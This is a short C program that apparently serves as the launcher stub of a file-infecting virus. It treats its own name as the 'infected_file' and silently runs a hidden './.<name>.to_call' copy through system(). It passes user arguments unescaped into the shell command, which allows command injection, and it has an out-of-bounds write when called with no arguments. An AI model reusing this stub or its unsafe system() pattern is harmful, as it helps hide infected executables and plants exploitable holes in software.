#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv) {
char command[100];
 char *infected_file = argv[0];
	//char *infected_file ;
	//strncpy(infected_file, infected_file1+2, strlen(infected_file1)-2);


    unsigned int i;
    size_t len = 0;
    char *_all_args, *all_args;

    for(i=1; i<argc; i++) {
        len += strlen(argv[i]);
    }

    _all_args = all_args = (char *)malloc(len+argc-1);

    for(i=1; i<argc; i++) {
        memcpy(_all_args, argv[i], strlen(argv[i]));
        _all_args += strlen(argv[i])+1;
        *(_all_args-1) = ' ';
    }
    *(_all_args-1) = 0;

    snprintf(command, sizeof(command), "./.%s.to_call %s %s", infected_file+2, infected_file+2, all_args);
    system(command);
    free(all_args);

    return 0;
}
